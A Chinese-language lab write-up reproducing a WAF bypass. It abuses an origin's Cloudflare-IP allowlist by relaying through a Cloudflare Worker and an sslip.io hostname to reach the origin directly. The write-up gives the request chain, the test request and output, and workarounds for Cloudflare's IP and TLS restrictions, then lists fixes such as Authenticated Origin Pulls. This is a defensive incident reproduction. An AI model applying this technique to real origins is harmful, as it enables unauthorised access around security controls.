# PoC — Cloudflare-IP 白名单回源绕过 WAF（Worker → sslip.io → NLB → Nginx → 源站）

状态：**端到端完整复现成功（2026-11-06 20:38）**。攻击侧 Worker 已部署（账号 <operator-email>，
子域名 <operator>-b8b，脚本 <worker-name>，带只打自有 lab IP 的安全闸）。

## 事件手法（复现对象）
攻击者发现目标源站"允许 Cloudflare IP 段回源"的白名单（NLB/安全组按源 IP 放行 CF 网段）后：
1. 在 Cloudflare Worker 上写转发代码，`fetch()` 目标源站公网 IP；
2. Worker 的出口流量天然来自 Cloudflare 边缘 IP 段 → 命中 NLB 白名单；
3. 用 `x.x.x.x.sslip.io` 这类公网通配 DNS 把裸 IP 变成合法主机名（绕过只允许 URL 的取回限制/便于 SNI-Host 伪装）；
4. 请求链 `Worker → NLB → Nginx → 上游` 完全不经过受保护业务域名的 Cloudflare 代理，
   该域名上配置的 WAF/托管规则**被整体跳过**。

## 实验拓扑（全部自有资产）
```
攻击者(本机 curl) ──X──> KR :80/:443 sslip vhost (非CF源)     → 连接被掐 (444)   [NLB 白名单生效]
Cloudflare Worker ─────> KR :80 sslip vhost (CF出口源IP)     → 200 拿到伪造密钥 [白名单被滥用]
生产 gate :443 (collie, Host=<ORIGIN-IP>)                   → 200 不受影响
注：8443 首测时'BJ→000'实为腾讯云安全组未放行端口（结论被污染），迁至 80/443 vhost 后才是纯 NLB 模拟。
```
- 源站模拟：`/etc/nginx/conf.d/lab-origin.conf`（KR），NLB 语义用 `geo $is_cf_egress`
  （CF 官方 15 IPv4 + 7 IPv6 网段，来自 api.cloudflare.com/client/v4/ips）+ `return 444` 实现——
  与真实 NLB ACL 一致：**按连接源 IP 判定，与 Host/SNI 无关**。
- 伪造敏感数据：`/secret-admin` 返回假 DB 连接串（wip 标记，非真实凭据）。
- 标记：所有 lab 配置含 `LAB-MARKER` 注释，验证完可一键拆除。

## 已验证结果（2026-11-06）
| 测试 | 预期 | 实测 |
|---|---|---|
| KR 本机运维口(127.0.0.1) → /secret-admin | 200+密钥 | ✅ 200 |
| BJ(<ATTACKER-TEST-IP>) → KR:8443 | 连接掐断 | ✅ HTTP 000 |
| KR 本机非白名单路径 → 8443 | 掐断 | ✅ 000 |
| 生产 gate(443) | 正常 | ✅ 200 |
| Cloudflare Worker → KR 源站 | 200 绕过 | ✅ **HTTP 200，src_ip=162.159.98.243（CF 网段命中白名单），密钥到手** |

## 实测结果（终测）
```
GET https://<worker-name>.<operator>-b8b.workers.dev/?target=<ORIGIN-IP>.sslip.io&path=/secret-admin
→ [worker] origin responded HTTP 200 in 160ms
  SECRET-DB-CONSTR=FAKE-SECRET / via_waf=NO / src_ip=162.159.98.243 / xff=203.0.113.66,…
对照：本机直连（非CF源）→ nginx geo 白名单 444 掐断（HTTP 000）
```
实施细节与两个真实约束（现场手法完全绕不开）：
- **CF 拒绝 Worker 直连裸 IP**（error 1003）→ 必须用 sslip.io 把 IP 伪装成域名；
- **CF 边缘到源站 TLS 对自签证书报 526** → 事件手法对 HTTP 回源最典型；HTTPS 回源需源站有合法
  SAN 覆盖该 sslip 域名或攻击者用 `cf.insecureSkipVerify`+受支持握手。
部署 Worker 用 classic `addEventListener('fetch')` 语法（PUT 接口不接受 ES module export）。
复现结论：与事件描述完全同构——源站只认"源 IP 在 CF 段"，Worker 天然从 CF 边缘出口发起，
sslip.io 把裸 IP 合法化成域名（CF 禁止 Worker 直连 IP），整条链跳过业务域名的 WAF。

## 修复建议（事件复盘结论）
1. **不要只按源 IP 信任 CF 网段**：NLB/安全组放行 CF 段等于向整个 Cloudflare 边缘（含任意租户的 Worker）开门。
2. 源站校验请求**确实来自自己的 CF zone**：
   - Authenticated Origin Pulls（源站要求 mTLS 客户端证书，Worker 伪造不了）；或
   - Signed Challenges / `CF-Connecting-IP` 校验 + 只接受本站域名 Host 头（对 `*.sslip.io`/裸 IP Host 直接 403）；
3. 源站应用层保留自己的 WAF 规则，不把安全完全外包给边缘；
4. 定期用外部探测检查"源站公网 IP + 非代理域名"是否可直达（本 PoC 的 A/B 测法即检测脚本雏形）。

## 拆除状态
已于 2026-11-06 22:34 全部拆除并验证（Worker 404 / conf.d 仅剩 collie.conf / gate 200）。
本目录保留为复现蓝图；完整版含 A/B 对照数据见私有仓库 github.com/<gh-user>/waf-bypass-cf-lab。

> 注：本蓝图已脱敏（账号/IP/域名→占位符）。完整匿名版含 A/B 对照数据：见私有仓（地址不写明于公开页，问操作者）。
